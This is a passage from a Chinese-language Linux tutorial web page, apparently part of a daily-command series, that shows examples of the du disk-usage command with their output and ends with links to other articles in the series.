&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-27&quot;&gt;27&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du|sort -nr|more&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1288&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;608&lt;/span&gt;     &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;308&lt;/span&gt;     &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;service&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;      &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deploy&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-15&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-17&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;product&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-19&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;info&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-21&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lib&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-23&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-25&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097a5437713975-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a5437713975-27&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0028 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例10：输出当前目录下各个子目录所使用的空间&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed097a9622795894&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du -h  --max-depth=1&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a9622795894-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a9622795894-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;  &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;depth&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0006 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed097ac345868908&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du -h  --max-depth=1

608K    ./test6

308K    ./test4

32K     ./scf

8.0K    ./test3

1.3M    .

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097ac345868908-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097ac345868908-13&quot;&gt;13&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -h  --max-depth=1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;608K&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;308K&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32K&lt;/span&gt;     &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8.0K&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1.3M&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed097ac345868908-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097ac345868908-13&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0014 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
